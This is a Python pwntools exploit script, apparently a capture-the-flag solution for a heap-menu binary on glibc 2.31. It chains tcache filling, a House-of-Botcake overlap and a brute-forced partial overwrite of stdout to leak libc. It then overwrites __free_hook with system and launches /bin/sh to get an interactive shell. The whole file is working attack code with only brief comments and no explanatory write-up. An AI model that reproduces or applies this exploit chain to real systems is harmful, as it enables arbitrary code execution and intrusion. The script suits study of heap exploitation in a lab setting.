from elftools.construct import lib
from pwn import *

context.log_level = "debug"
context.arch = "amd64"
context.os = "linux"
context.terminal = ["/usr/bin/tmux", "sp", "-h"]
# context.timeout = 1

f_remote = True if "remote" in sys.argv else False
f_gdb = True if "gdb" in sys.argv else False

vuln_path = "./pwn"
libc_path = "./libc-2.31.so"

elf, rop = ELF(vuln_path), ROP(vuln_path)
libc, roplibc = ELF(libc_path), ROP(libc_path)

def get_io():
    if not f_remote:
        io = process([vuln_path])
        # io = process([ld_path, vuln_path], env={"LD_PRELOAD": libc_path})
    else:
        io = remote("", 9999)
    return io

def ddebug(io, b=""):
    if not f_gdb:
        return

    gdb.attach(io, gdbscript=b)
    pause()


def add(io, idx, size):
    io.sendlineafter(">> ", b"1")
    io.sendlineafter("Index: ", str(idx))
    io.sendlineafter("Size: ", str(size))

def edit(io,idx, new_size, content):
    io.sendlineafter(">> ", b"3")
    io.sendlineafter("Index: ", str(idx))
    io.sendlineafter("of content: ", new_size)
    io.sendafter("to say: ", content)

def delete(io, idx):
    io.sendlineafter(">> ", b"2")
    io.sendlineafter("Index: ", str(idx))

def pwn():
    io = get_io()
    for i in range(11):
        add(io, i, 0x80)
    edit(io, 0, b"%136c"+p64(0x511), "tt")
    delete(io, 1)

    
    for i in range(11, 18):
        add(io, i, 0x80)

    for i in range(18, 20): # botcake
        add(io, i, 0x80)

    for i in range(11, 18): # fill tcache
        delete(io, i)
    add(io, 0x20-1, 0x10) # 避免和top合并

    
    delete(io, 19)
    delete(io, 18)
    add(io, 11, 0x80)
    delete(io, 9) # botcake完成
    add(io, 12, 0x40)  
    add(io, 13, 0x30)  #两次malloc, 让unb中的指针后移到19节点，里面有main_arena偏移
    edit(io, 12, b"a"*0x50+p64(0x80), b"tt") # 改下一card的size
    edit(io, 13, b"100", b"t"*0x38+b"\x98\xb6") #最后2为改为“0xb690”,1/16概率中stdout, 0xb6a0,因为本题前8字节为size,所以-0x8

    add(io, 14, 0x80)  
    add(io, 15, 0x80)  
    edit(io, 15, b"128", p64(0xfbad1800) + p64(0)*3 + b"\x00")
    libc.address = u64(io.recvuntil("\x7f", timeout=0.11)[-6:].ljust(8, b"\x00")) - 0x1ec980
    log.success("libc:-----> " + hex(libc.address))
    if libc.address < 0:
        return 

    _free_hook = libc.symbols.get("__free_hook", 0)
    log.success("free_hook:-----> " + hex(_free_hook))
    system_addr = libc.symbols.get("system", 0)
    log.success("system:-----> "+hex(system_addr))
    
    edit(io, 13, b"100", b"c"*0x28+p64(0)+p64(0x91))
    delete(io, 14)
    edit(io, 13, b"A"*8, b"c"*0x38+p64(_free_hook-0x8))
    add(io, 16, 0x80)
    add(io, 17, 0x80)
    edit(io, 17, b"50", p64(system_addr))
    # ddebug(io, "breakrva 0x16c4\ncontinue")
    edit(io, 11, b"a"*0x90+b"/bin/sh\x00", b"a"*0x80)

    delete(io, 12)
    io.interactive()
    

# pwn()
for i in range(30):
    try:
        log.success(f"==========={i}============")
        pwn()
        time.sleep(0.5)
    except:
        pass
